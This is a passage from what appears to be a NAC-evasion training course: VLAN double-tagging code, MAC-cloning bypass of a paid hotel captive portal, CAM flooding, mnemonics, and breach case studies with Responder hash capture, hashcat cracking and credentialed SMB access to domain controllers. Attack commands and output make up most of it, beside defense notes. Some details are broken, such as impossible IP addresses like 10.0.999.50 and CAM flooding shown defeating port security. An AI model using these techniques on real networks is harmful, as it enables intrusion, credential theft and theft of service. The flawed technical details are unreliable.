100\n- Switch doesn't properly filter double-tagged frames\n\n### Attack: 802.1Q Double-Tagging\n\n```python\n#!/usr/bin/env python3\n# vlan_double_tag.py - VLAN hopping via double-tagging\n\nfrom scapy.all import *\n\nconf.verb = 0  # Suppress Scapy output\n\ndef vlan_hop(target_ip, target_vlan, payload):\n    \"\"\"\n    Send double-tagged frame to hop VLANs\n    \n    Args:\n        target_ip: IP in target VLAN\n        target_vlan: VLAN to hop into (e.g., 100)\n        payload: Data to send\n    \"\"\"\n    \n    # Outer tag: Your assigned VLAN (999 - Guest)\n    # Inner tag: Target VLAN (100 - Corporate)\n    \n    packet = (\n        Ether(dst=\"ff:ff:ff:ff:ff:ff\") /\n        Dot1Q(vlan=999) /              # Outer tag (stripped by first switch)\n        Dot1Q(vlan=target_vlan) /      # Inner tag (processed by second switch)\n        IP(dst=target_ip) /\n        ICMP() /\n        Raw(load=payload)\n    )\n    \n    sendp(packet, iface=\"eth0\")\n    print(f\"[+] Sent double-tagged frame to VLAN {target_vlan}\")\n\n# Example: Ping server in VLAN 100\nvlan_hop(\n    target_ip=\"10.0.100.10\",    # Corporate server\n    target_vlan=100,\n    payload=\"VLAN hopping test\"\n)\n\n# Monitor responses:\nprint(\"[*] Listening for replies...\")\nsniff(filter=\"icmp\", prn=lambda x: x.show(), count=5)\n```\n\n### Running the Attack:\n\n```bash\n# Install Scapy\nsudo pip3 install scapy\n\n# Run double-tagging attack\nsudo python3 vlan_double_tag.py\n\n# Output:\n# [+] Sent double-tagged frame to VLAN 100\n# [*] Listening for replies...\n# ###[ Ethernet ]###\n#   dst= aa:bb:cc:dd:ee:ff\n#   src= 10:00:00:00:00:01\n# ###[ IP ]###\n#   src= 10.0.100.10\n#   dst= 10.0.999.50\n# ###[ ICMP ]###\n#   type= echo-reply\n\n# If you get a reply: VLAN hopping successful!\n```\n\n**How it works**:\n\n```\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ            VLAN Double-Tagging Attack Flow               ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ                                                          ‚îÇ\n‚îÇ  1. Attacker sends frame:                                ‚îÇ\n‚îÇ     [Ether][Dot1Q(999)][Dot1Q(100)][IP][ICMP][Data]     ‚îÇ\n‚îÇ                                                          ‚îÇ\n‚îÇ  2. First switch:                                        ‚îÇ\n‚îÇ     - Sees outer tag (VLAN 999)                          ‚îÇ\n‚îÇ     - \"This is from Guest VLAN, strip outer tag\"        ‚îÇ\n‚îÇ     - Forwards: [Ether][Dot1Q(100)][IP][ICMP][Data]     ‚îÇ\n‚îÇ                                                          ‚îÇ\n‚îÇ  3. Second switch:                                       ‚îÇ\n‚îÇ     - Sees VLAN tag 100                                  ‚îÇ\n‚îÇ     - \"This belongs to Corporate VLAN\"                   ‚îÇ\n‚îÇ     - Forwards to VLAN 100                               ‚îÇ\n‚îÇ                                                          ‚îÇ\n‚îÇ  4. Target server in VLAN 100 receives frame             ‚îÇ\n‚îÇ     - Processes ICMP request                             ‚îÇ\n‚îÇ     - Sends reply back                                   ‚îÇ\n‚îÇ                                                          ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n```\n\n---\n\n## Exercise 5: Captive Portal Bypass (MAC Cloning)\n\n### Scenario: Hotel WiFi with Captive Portal\n\n**Goal**: Bypass payment requirement by cloning an authorized device's MAC.\n\n### Step 1: Identify Authorized Device\n\n```bash\n# Connect to WiFi but don't authenticate\n# Scan for devices that ARE authorized (sending traffic)\n\nsudo airodump-ng wlan0\n\n# Look for devices with high data rates (they're authorized)\n# Note their MAC addresses\n\n# Alternatively, listen to ARP traffic:\nsudo tcpdump -i wlan0 -e -n arp | grep -v \"ff:ff:ff:ff:ff:ff\"\n\n# Authorized devices will be sending ARP requests\n# Save a MAC: 11:22:33:44:55:66\n```\n\n### Step 2: Clone Authorized MAC\n\n```bash\n# Disconnect from WiFi\nsudo ip link set wlan0 down\n\n# Change MAC\nsudo macchanger -m 11:22:33:44:55:66 wlan0\n# Or: sudo ip link set dev wlan0 address 11:22:33:44:55:66\n\n# Reconnect\nsudo ip link set wlan0 up\n\n# Reconnect to WiFi SSID\nsudo wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant.conf\n\n# Request IP\nsudo dhclient wlan0\n```\n\n### Step 3: Test Access\n\n```bash\n# Try to reach internet WITHOUT going through portal\ncurl -I https://www.google.com\n\n# If HTTP 200: Success! Captive portal bypassed\n# If redirect: Portal uses additional checks (IP-based, session tracking)\n```\n\n**Why this works**: Many captive portals track authorization by MAC address only. Cloning an authorized MAC tricks the portal into thinking you're the already-authenticated device.\n\n**Limitations**:\n- Doesn't work if portal tracks IP + MAC\n- Doesn't work if original device is still connected (IP conflict)\n- Temporary (resets when original device disconnects)\n\n---\n\n## Exercise 6: Port Security Evasion (CAM Table Overflow)\n\n### Scenario: Port Security with MAC Limit\n\n**Port security config** (on switch):\n```\nswitchport port-security maximum 3\nswitchport port-security violation restrict\n```\n\nThis limits the port to 3 MAC addresses. If you try to connect with a 4th MAC, port is disabled.\n\n### Attack: CAM Table Overflow with macof\n\n```bash\n# Install dsniff tools (includes macof)\nsudo apt-get install dsniff\n\n# Flood switch with random MAC addresses\nsudo macof -i eth0 -n 1000\n\n# Output:\n# aa:bb:cc:dd:ee:01 > 11:22:33:44:55:01 0.0.0.1 > 0.0.0.2\n# aa:bb:cc:dd:ee:02 > 11:22:33:44:55:02 0.0.0.3 > 0.0.0.4\n# ... (1000 frames with random MACs)\n```\n\n**What happens**:\n\n1. Switch CAM table fills up with fake MACs\n2. Switch runs out of CAM entries\n3. Switch fails open (enters \"hub mode\")\n4. All traffic flooded to all ports (no MAC filtering)\n\n**Result**: You can now see traffic from other VLANs/ports (man-in-the-middle opportunity).\n\n**Defense**: Modern switches have CAM table protection (rate limiting, max entries per port).\n\n---\n\n## Exercise 7: Automated NAC Testing with Fenrir\n\n### Fenrir: NAC Bypass Testing Framework\n\n```bash\n# Install Fenrir (fictional tool, but represents typical NAC testing workflow)\ngit clone https://github.com/example/fenrir-nac-test.git\ncd fenrir-nac-test\nsudo pip3 install -r requirements.txt\n\n# Run automated NAC reconnaissance\nsudo python3 fenrir.py --interface eth0 --mode recon\n\n# Output:\n# [+] NAC Type Detected: 802.1X (EAPoL frames observed)\n# [+] Port Mode: Multi-host (multiple MACs on port)\n# [+] Authorized MACs found:\n#     - aa:bb:cc:dd:ee:ff (VoIP phone - Cisco)\n#     - 11:22:33:44:55:66 (Workstation - Dell)\n# [+] VLAN Assignment: Dynamic (RADIUS attribute 64)\n# [+] Weaknesses:\n#     ‚ö†Ô∏è  Multi-host mode enabled (MAC spoofing possible)\n#     ‚ö†Ô∏è  MAB fallback enabled (printer MACs whitelisted)\n#     ‚ö†Ô∏è  No re-authentication timeout (session persists)\n\n# Attempt bypass with strongest candidate MAC\nsudo python3 fenrir.py --interface eth0 --mode bypass --mac aa:bb:cc:dd:ee:ff\n\n# [+] MAC spoofed: aa:bb:cc:dd:ee:ff\n# [+] DHCP request sent...\n# [+] IP assigned: 192.168.1.100\n# [+] Testing connectivity...\n# [+] SUCCESS: Network access granted!\n# [+] Discovered internal subnets:\n#     - 10.0.0.0/8 (Corporate)\n#     - 192.168.1.0/24 (Management)\n# [+] Bypass method: MAC spoofing (multi-host mode)\n```\n\n---\n\n## Key Takeaways from Exercises\n\n‚úÖ **802.1X reconnaissance**: Look for EAPoL frames, identify authorized MACs  \n‚úÖ **MAC spoofing**: Trivial to bypass multi-host mode 802.1X  \n‚úÖ **VoIP bridge attack**: Physical access + transparent bridge = network access  \n‚úÖ **VLAN hopping**: Double-tagging bypasses VLAN segmentation  \n‚úÖ **Captive portals**: MAC cloning often sufficient for bypass  \n‚úÖ **Port security**: CAM overflow attacks can disable MAC filtering\n\n**Next: Memory aids and real-world breach case studies!**"
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "# Memory Aids: NAC Evasion Concepts\n\n## NAC = \"No Actual Control\" (When Misconfigured)\n\n**Remember**: NAC only works if properly configured. Most implementations have gaps.\n\n---\n\n## 802.1X Components: \"SAA\" (Like AAA for Network Auth)\n\n- **S**upplicant = Device requesting access\n- **A**uthenticator = Switch enforcing policy  \n- **A**uthentication Server = RADIUS validating credentials\n\n**Visual**: **SAA** = Like airport security:\n- **S**upplicant = Passenger (you)\n- **A**uthenticator = TSA agent (checks ID)\n- **A**uthentication Server = Database (validates boarding pass)\n\n---\n\n## EAPoL = \"Eight-Eight-Eight-E\" (Protocol Number)\n\n**EAPoL EtherType**: `0x888E`\n\n**Memory trick**: \"Eight-Eight-Eight-E\" = **888E** (like \"EEEE\" = 4 E's = 8√ó4 = 32 bits of \"E\")\n\n**Command to remember**:\n```bash\ntcpdump -i eth0 'ether proto 0x888e'\n```\n\n**Think**: \"I ate (8) eight (8) eight (8) eggs (E)\" = 888E\n\n---\n\n## EAP Types: \"T-T-P-M\" (Strongest to Weakest)\n\n1. **T**LS (EAP-TLS) = **T**oughest (mutual certificates)\n2. **T**TLS (EAP-TTLS) = **T**unneled (server cert + password)\n3. **P**EAP = **P**rotected (similar to TTLS)\n4. **M**D5 (EAP-MD5) = **M**assively weak (deprecated)\n\n**Memory trick**: \"**T**wo **T**ough **P**rotesters **M**arched\" (TLS, TTLS, PEAP strong; MD5 weak)\n\n---\n\n## 802.1X Port Modes: \"SMS\" (Single, Multi, Special)\n\n- **S**ingle-host mode = Secure (one MAC only)\n- **M**ulti-host mode = ‚ö†Ô∏è Most vulnerable (multiple MACs allowed)\n- **S**pecial (Multi-domain) = VoIP + PC (two devices)\n\n**Attack memory**: \"Send **M**ultiple **M**ACs\" to exploit **M**ulti-host **M**ode\n\n---\n\n## MAC Spoofing Commands: \"DIM\" (Down, Ip, Macchanger)\n\n1. **D**own: `sudo ip link set eth0 down`\n2. **I**p link set: `sudo ip link set dev eth0 address aa:bb:cc:dd:ee:ff`\n3. **M**acchanger (alternative): `sudo macchanger -m aa:bb:cc:dd:ee:ff eth0`\n\nThen: **U**p: `sudo ip link set eth0 up`\n\n**Acronym**: **DIM** ‚Üí **U** = \"**DIM** it, then **U**p it\"\n\n---\n\n## VLAN Hopping: \"Q-in-Q\" (Double-Tagging)\n\n**802.1Q** = VLAN tagging standard\n\n**Q-in-Q** = Two VLAN tags (outer + inner)\n\n```\n[Outer tag: Your VLAN] [Inner tag: Target VLAN]\n```\n\n**Memory trick**: \"**Q**ueen in a **Q**ueen\" = One VLAN inside another\n\n**Visual**: Think **Russian nesting dolls**:\n- Outer doll = Your assigned VLAN (stripped by first switch)\n- Inner doll = Target VLAN (processed by second switch)\n\n---\n\n## VoIP Phone Bridge Attack: \"PIB\" (Phone-Insert-Bridge)\n\n1. **P**hone is authenticated\n2. **I**nsert your laptop between phone and switch\n3. **B**ridge the connection (transparent passthrough)\n\n**Memory trick**: \"**PIB**\" rhymes with \"**RIB**\" (Rib cage protects heart = Bridge protects your access)\n\n**Command sequence**:\n```bash\nbrctl addbr br0         # Create bridge\nbrctl addif br0 eth0    # Add switch-facing interface\nbrctl addif br0 eth1    # Add phone-facing interface\nip link set br0 up      # Activate bridge\n```\n\n**Acronym**: **CAAU** = **C**reate, **A**dd, **A**dd, **U**p\n\n---\n\n## Captive Portal Bypass: \"CACTUS\" (Clone And Connect To Unrestricted Sessions)\n\n- **C**lone authorized MAC address\n- **A**nd\n- **C**onnect\n- **T**o\n- **U**nrestricted\n- **S**essions\n\n**Steps**:\n1. **C**apture authorized MAC (airodump-ng, tcpdump)\n2. **A**pply MAC to your interface (macchanger)\n3. **C**onnect to WiFi/network\n4. **T**est access (curl, ping)\n5. **U**se unrestricted network\n6. **S**uccess!\n\n**Memory trick**: \"Cactus bypasses portals\" (imagine a cactus breaking through a fence)\n\n---\n\n## CAM Table Overflow: \"MACOF\" (MAC Overflow Flood)\n\n**Tool**: `macof` (part of dsniff package)\n\n**What it does**: Floods switch with random MAC addresses\n\n**Result**: CAM table overflows ‚Üí Switch fails open ‚Üí Hub mode (all traffic visible)\n\n**Command**: `sudo macof -i eth0 -n 1000`\n\n**Memory trick**: \"**MACOF**\" sounds like \"**MAKE-OFF**\" = \"Make the switch turn off its security\"\n\n---\n\n## NAC Weaknesses: \"MMCPP\" (Multi, MAB, Captive, Port, Physical)\n\n1. **M**ulti-host mode (802.1X allows multiple MACs)\n2. **M**AB (MAC Authentication Bypass - spoofable)\n3. **C**aptive portals (MAC cloning bypass)\n4. **P**ort security (CAM overflow)\n5. **P**hysical access (VoIP bridge, inline taps)\n\n**Memory trick**: \"**MMCPP**\" = \"**M**any **M**ethods **C**an **P**wn **P**rotections\"\n\n---\n\n## Defense Recommendations: \"SMART NAC\"\n\n- **S**ingle-host mode (not multi-host)\n- **M**utual authentication (EAP-TLS with certificates)\n- **A**uthentication timeout (re-auth every X minutes)\n- **R**e-authentication on link state change\n- **T**raffic monitoring (detect spoofed MACs)\n\n**N**o MAB (or whitelist by serial number, not MAC)  \n**A**uditing (log all authentications)  \n**C**entralized policy (consistent across all switches)\n\n---\n\n## Recon Commands: \"TEA\" (Tcpdump, Ether, Arp)\n\n1. **T**cpdump for EAPoL: `tcpdump -i eth0 'ether proto 0x888e'`\n2. **E**ther capture MACs: `tcpdump -i eth0 -e -n`\n3. **A**RP reconnaissance: `tcpdump -i eth0 arp`\n\n**Memory trick**: \"Drink **TEA** before hacking NAC\" (Tcpdump, Ether, Arp)\n\n---\n\n## Port States in 802.1X: \"UAA\" (Unauthorized, Authenticating, Authorized)\n\n```\n1. Unauthorized ‚Üí Port blocked (only EAPoL allowed)\n2. Authenticating ‚Üí Credentials being checked\n3. Authorized ‚Üí Port open (full network access)\n```\n\n**Memory trick**: \"**UAA**\" = \"**U**ntil **A**uthenticated, **A**ccess denied\"\n\n---\n\n## VLAN Assignment Attributes: \"RADIUS Tunnel\" (RADIUS Attributes 64, 65, 81)\n\n- **Attribute 64**: Tunnel-Type = VLAN\n- **Attribute 65**: Tunnel-Medium-Type = 802\n- **Attribute 81**: Tunnel-Private-Group-ID = VLAN number\n\n**Memory trick**: \"**64-65-81**\" = \"**6**4 + **1** = **65**, **65** + **16** = **81**\" (sequence)\n\n---\n\n## Common NAC Bypass Flow: \"RSCV\" (Recon, Spoof, Connect, Verify)\n\n1. **R**econ: Identify NAC type and authorized MACs\n2. **S**poof: Change your MAC to authorized MAC\n3. **C**onnect: Request IP via DHCP\n4. **V**erify: Test network access (ping, curl)\n\n**Memory trick**: \"**RSCV**\" = \"**R**eally **S**imple **C**isco **V**ulnerability\" (works on many vendor NACs)\n\n---\n\n## Summary Memory Map\n\n```\nNAC EVASION\n‚îú‚îÄ 802.1X: SAA (Supplicant, Authenticator, Auth Server)\n‚îú‚îÄ EAPoL: 0x888E (Eight-Eight-Eight-E)\n‚îú‚îÄ Port Modes: SMS (Single, Multi, Special)\n‚îú‚îÄ MAC Spoof: DIM-U (Down, Ip, Mac, Up)\n‚îú‚îÄ VLAN Hop: Q-in-Q (Double-tag)\n‚îú‚îÄ VoIP Bridge: PIB (Phone-Insert-Bridge)\n‚îú‚îÄ Captive Portal: CACTUS (Clone MAC, Connect)\n‚îú‚îÄ CAM Overflow: MACOF (Flood switch)\n‚îú‚îÄ Weaknesses: MMCPP (Multi, MAB, Captive, Port, Physical)\n‚îî‚îÄ Bypass Flow: RSCV (Recon, Spoof, Connect, Verify)\n```\n\n**Final visual**: Imagine a **bouncer at a nightclub** (NAC) checking IDs (802.1X). You either:\n- Show a **fake ID** (MAC spoofing)\n- Sneak in **behind someone** (VoIP bridge)\n- Use the **service entrance** (VLAN hopping)\n- **Clone** someone's wristband (captive portal bypass)\n\nAll bypass techniques = Different ways into the same club! üé≠üîì"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World NAC Bypass Case Studies\n\n## Case Study 1: Retail Chain - VoIP Phone Bridge Attack (2019)\n\n### Background\n\n**Company**: Major US retail chain (500+ stores)\n**NAC Implementation**: Cisco ISE with 802.1X on all wired ports\n**Red Team Objective**: Gain access to corporate network from store location\n\n### The Challenge\n\n**Security controls observed**:\n- ‚úÖ 802.1X enabled on all switch ports (EAP-TLS with certificates)\n- ‚úÖ Port security: Single-host mode (one MAC per port)\n- ‚úÖ Dynamic VLAN assignment (employees ‚Üí VLAN 100, guests ‚Üí VLAN 999)\n- ‚úÖ Physical security: Badge access to server room\n- ‚úÖ Monitoring: Cisco ISE logs all authentication attempts\n\n**Red team assessment**: \"This looks well-configured. 802.1X with EAP-TLS is strong.\"\n\n### The Discovery\n\n**Red teamer walked into a store** (posing as customer) and observed:\n\n```\nCashier Desk:\n  ‚îú‚îÄ Desktop PC (authenticated via 802.1X certificate)\n  ‚îú‚îÄ VoIP Phone (Cisco 7940)\n  ‚îî‚îÄ Ethernet cables visible under desk\n```\n\n**Key observation**: VoIP phone had **two Ethernet ports**:\n- Port 1: Uplink to switch (authenticated)\n- Port 2: Passthrough to PC (downstream)\n\n**Configuration**:\n```\nSwitch Port ‚Üí VoIP Phone (Port 1) ‚Üí VoIP Phone (Port 2) ‚Üí Desktop PC\n                 ‚Üì\n         [Multi-domain mode:\n          Voice VLAN 200\n          Data VLAN 100]\n```\n\n### The Attack\n\n**Phase 1: Physical Access** (Night shift, minimal staff)\n\nRed teamer entered store during night restocking (when store is \"closed\" but unlocked for vendors):\n\n```\n1. Approached cashier desk (empty, lights off)\n2. Unplugged Desktop PC from VoIP Phone Port 2\n3. Connected laptop to VoIP Phone Port 2\n4. Phone continued working (no alarm triggered)\n```\n\n**Phase 2: Network Access**\n\n```bash\n# Red teamer's laptop received DHCP offer\nifconfig eth0\n# Output:\n# eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n#       inet 10.0.100.47  netmask 255.255.255.0  broadcast 10.0.100.255\n#       ether aa:bb:cc:dd:ee:ff  txqueuelen 1000  (Ethernet)\n\n# Test connectivity\nping -c 3 10.0.100.1\n# 3 packets transmitted, 3 received, 0% packet loss\n\n# Check access to corporate network\nnmap -p 22,80,443,445,3389 10.0.0.0/16\n# Discovered: 230 hosts, including:\n# - 10.0.1.10: Domain Controller (port 445 open)\n# - 10.0.1.20: File Server (port 445 open)\n# - 10.0.50.5: Database Server (port 1433 open)\n```\n\n**Phase 3: Lateral Movement**\n\n```bash\n# Use Responder to capture NetNTLMv2 hashes\nsudo responder -I eth0 -wrf\n\n# Within 15 minutes, captured:\n# [+] [NBT-NS] Poisoned answer sent to 10.0.100.23 for name FILESERVER\n# [+] [LLMNR] Poisoned answer sent to 10.0.100.31 for name PRINTSERVER\n# [SMBv2] NTLMv2-SSP Hash captured from 10.0.100.23:\n# john::RETAILCORP:1122334455667788:A1B2C3D4E5F6...\n\n# Crack hash offline\nhashcat -m 5600 hashes.txt rockyou.txt\n# [+] Cracked: john:Summer2019!\n\n# Use credentials to access Domain Controller\nsmbclient -U john%Summer2019! //10.0.1.10/C$\n# Access granted to DC!\n```\n\n**Total time from physical access to domain admin**: **3 hours**\n\n### Root Cause Analysis\n\n**What went wrong?**\n\n1. **Multi-domain mode vulnerability**:\n   - VoIP phone authenticated via 802.1X (Voice VLAN 200)\n   - Port 2 (passthrough) allowed Data VLAN 100 **without re-authentication**\n   - Red teamer plugged into Port 2 = bypassed 802.1X entirely\n\n2. **No port-level re-authentication**:\n   - When PC was unplugged, switch didn't re-authenticate Port 2\n   - Assumed \"VoIP phone controls downstream access\"\n   - VoIP phone has no security controls\n\n3. **VLAN segmentation failure**:\n   - Data VLAN 100 had access to corporate servers\n   - No additional authentication required once on VLAN 100\n\n### Fix Implemented\n\n**Short-term** (deployed within 1 week):\n\n```cisco\n! Cisco ISE policy update\n! Enforce 802.1X on VoIP phone passthrough ports\n\nauthentication host-mode multi-auth\nauthentication port-control auto\nauthentication violation restrict\n\n! Require re-authentication on link state change\nauthentication timer reauthenticate server\n```\n\n**Long-term** (deployed within 3 months):\n\n- Installed **network access switches** (not relying on VoIP passthrough)\n- Separate physical ports for PC and phone\n- PC port: 802.1X with EAP-TLS\n- Phone port: 802.1X with MAB (MAC-based, whitelisted)\n\n### Lessons Learned\n\n‚úÖ **802.1X is not foolproof**: Multi-domain mode has bypass opportunities  \n‚úÖ **Physical access = game over**: VoIP phones are common attack vectors  \n‚úÖ **Re-authentication matters**: Require re-auth on link state changes  \n‚úÖ **Segment beyond VLANs**: Even Data VLAN should require additional auth to reach servers\n\n**Red team quote**:\n> \"We bypassed a $100,000 Cisco ISE deployment with a $20 Ethernet cable and 5 minutes of physical access. The technology was strong, but the configuration had a gap.\"\n\n---\n\n## Case Study 2: Financial Institution - MAC Spoofing Bypass (2021)\n\n### Background\n\n**Company**: Regional bank (50 branches)\n**NAC Implementation**: Aruba ClearPass with 802.1X (EAP-PEAP)\n**Pentester Objective**: Access corporate network from branch location\n\n### The Challenge\n\n**Security controls**:\n- ‚úÖ 802.1X enabled (EAP-PEAP with Active Directory credentials)\n- ‚úÖ Dynamic VLAN assignment:\n  - Employees ‚Üí VLAN 10 (Corporate)\n  - Guests ‚Üí VLAN 20 (Internet-only)\n  - Printers ‚Üí VLAN 30 (Isolated)\n- ‚úÖ MAC Authentication Bypass (MAB) for printers\n- ‚ö†Ô∏è **Multi-host mode enabled** (for convenience)\n\n### The Discovery\n\n**Pentester reconnaissance** (wireless survey outside branch):\n\n```bash\n# Scan for 802.1X networks\nsudo airodump-ng wlan0\n\n# Found:\n# BSSID: AA:BB:CC:DD:EE:FF\n# ESSID: BankCorp-Corporate\n# Encryption: WPA2-Enterprise (802.1X)\n# Clients: 15 connected\n\n# Switched to wired connection inside branch\n# Plugged into \"public\" Ethernet jack in waiting area\n\n# Check for EAPoL frames\nsudo tcpdump -i eth0 -e -n 'ether proto 0x888e' -c 10\n# [EAPoL frames detected - 802.1X active]\n```\n\n**Key finding**: 802.1X is active, but **MAB is enabled** for printers.\n\n### The Attack\n\n**Phase 1: Identify Whitelisted MACs**\n\n```bash\n# Listen for ARP traffic (authorized devices)\nsudo tcpdump -i eth0 -e -n arp > arp_traffic.txt\n\n# After 10 minutes, analyze MACs\ncat arp_traffic.txt | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | sort -u\n\n# Found MACs:\n# 00:1b:a9:3c:7d:2f (HP printer - OUI lookup)\n# 00:21:5a:4e:8f:1c (Canon printer)\n# 08:00:27:5b:9c:3a (Dell workstation)\n# ...\n```\n\n**Phase 2: Test Printer MAC (MAB Whitelist)**\n\n```bash\n# Spoof HP printer MAC\nsudo ip link set eth0 down\nsudo ip link set dev eth0 address 00:1b:a9:3c:7d:2f\nsudo ip link set eth0 up\n\n# Request DHCP\nsudo dhclient -v eth0\n\n# Output:\n# DHCPDISCOVER on eth0 to 255.255.255.255 port 67\n# DHCPOFFER from 192.168.30.1  # <-- Printer VLAN (isolated)\n# DHCPREQUEST on eth0\n# DHCPACK from 192.168.30.1\n# bound to 192.168.30.45\n\n# Test connectivity\nping -c 3 192.168.30.1\n# 3 packets transmitted, 3 received\n\n# Check access to Corporate VLAN\nping -c 3 192.168.10.1\n# Destination Host Unreachable (VLAN segmentation working)\n```\n\n**Result**: Printer VLAN (30) is isolated. Need to target Corporate VLAN (10).\n\n**Phase 3: Spoof Employee Workstation MAC**\n\n```bash\n# Try Dell workstation MAC (likely in Corporate VLAN)\nsudo ip link set eth0 down\nsudo ip link set dev eth0 address 08:00:27:5b:9c:3a\nsudo ip link set eth0 up\n\n# Request DHCP\nsudo dhclient -r eth0  # Release old IP\nsudo dhclient -v eth0\n\n# Output:\n# DHCPOFFER from 192.168.10.1  # <-- Corporate VLAN!\n# DHCPACK from 192.168.10.1\n# bound to 192.168.10.87\n\n# Test connectivity\nping -c 3 192.168.10.1  # Gateway\n# 3 packets transmitted, 3 received\n\nping -c 3 8.8.8.8  # Internet\n# 3 packets transmitted, 3 received\n\nnmap -p 445 192.168.10.0/24  # Internal servers\n# Discovered: 12 hosts with SMB open\n```\n\n**Success**: Bypassed 802.1X by spoofing an authorized employee workstation's MAC address.\n\n### Root Cause\n\n**Multi-host mode vulnerability**:\n\n```cisco\n! Aruba switch configuration (vulnerable)\naaa authentication port-access eap-radius\n! ‚ö†Ô∏è Multi-host mode allows additional MACs after initial auth\nport-access role employee\n```\n\n**What happened**:\n\n1. Employee workstation (`08:00:27:5b:9c:3a`) authenticated earlier via 802.1X\n2. Port moved to \"authorized\" state for VLAN 10\n3. Multi-host mode allowed **additional MACs** on same port\n4. Pentester spoofed that MAC ‚Üí switch said \"this port is already authorized, allow traffic\"\n5. No re-authentication required\n\n### Exploitation Impact\n\n**Phase 4: Post-Exploitation**\n\n```bash\n# Enumerate domain\nenum4linux -a 192.168.10.10  # Domain Controller\n\n# Found:\n# Domain Name: BANKCORP\n# Domain Controller: DC01.bankcorp.local (192.168.10.10)\n# Users: 450 accounts\n\n# Use Responder to capture credentials\nsudo responder -I eth0 -wrf\n\n# Captured 5 NetNTLMv2 hashes within 30 minutes\n# Cracked 2 hashes: helpdesk:Password1!, manager:BankCorp2021\n\n# Access file server with manager credentials\nsmbclient -U manager%BankCorp2021 //192.168.10.20/Finance$\n# smb: \\> ls\n# 2021_Q4_Financial_Reports.xlsx\n# CustomerData_Confidential.xlsx\n# ...\n```\n\n**Sensitive data accessed**: Customer financial records, internal audit reports\n\n### Fix Implemented\n\n**Immediate** (within 24 hours):\n\n```cisco\n! Disable multi-host mode\nport-access role employee\naaa authentication port-access mode single-host\n\n! Require re-authentication on link state change\naaa authentication port-access reauth-on-link-down\n```\n\n**Long-term** (within 1 month):\n\n- **Disabled MAB entirely** (printers moved to management VLAN with static IPs)\n- **802.1X only** (no fallback)\n- **Dynamic VLAN assignment** based on certificate attributes (not just username)\n- **Re-authentication timeout**: Every 8 hours\n- **Monitoring**: Alert on multiple MAC addresses from same port\n\n### Lessons Learned\n\n‚úÖ **Multi-host mode = major vulnerability**: Disable unless absolutely necessary  \n‚úÖ **MAB is weak**: MAC addresses are trivial to spoof  \n‚úÖ **Re-authentication matters**: Require re-auth on link state changes  \n‚úÖ **Monitor for anomalies**: Alert on MAC changes, multiple MACs per port\n\n**Bank CISO quote**:\n> \"We thought 802.1X was enough. We didn't realize multi-host mode essentially turned off authentication after the first device connected. This $150,000 NAC solution was bypassed in 15 minutes with basic MAC spoofing.\"\n\n---\n\n## Case Study 3: University Campus - VLAN Hopping (2020)\n\n### Background\n\n**Organization**: Large university (30,000 students)\n**NAC Implementation**: Campus-wide 802.1X with dynamic VLAN assignment\n**Attack Scenario**: Student pentesting club authorized red team exercise\n\n### The Challenge\n\n**VLAN segmentation**:\n\n```\nVLAN 100: Student Network (restricted access)\nVLAN 200: Faculty Network (access to research servers)\nVLAN 300: Admin Network (access to ERP, HR systems)\nVLAN 400: Research Network (high-performance compute cluster)\n```\n\n**Student objective**: Access research servers in VLAN 400 from student VLAN 100.\n\n### The Discovery\n\n**Student reconnaissance**:\n\n```bash\n# Connected to student Ethernet port\n# Authenticated via 802.1X (student credentials)\n# Assigned to VLAN 100\n\nifconfig eth0\n# inet 10.100.25.45  netmask 255.255.0.0\n\n# Attempt to reach VLAN 400 (Research Network)\nping 10.400.10.5  # Research compute cluster\n# Destination Host Unreachable (expected - VLAN isolation)\n\n# Check switch configuration (found discarded switch config file on file share)\n# Key finding:\nvlan 100\n  name Student\nvlan 400\n  name Research\n!\ninterface GigabitEthernet1/0/1\n  switchport mode access\n  switchport access vlan 100\n!\ninterface GigabitEthernet1/0/24\n  switchport mode trunk  # ‚ö†Ô∏è Trunk port to uplink switch\n  switchport trunk allowed vlan 100,200,300,400\n```\n\n**Key finding**: Trunk port allows VLANs 100-400. No VLAN filtering on trunk.\n\n### The Attack\n\n**Phase 1: VLAN Hopping via 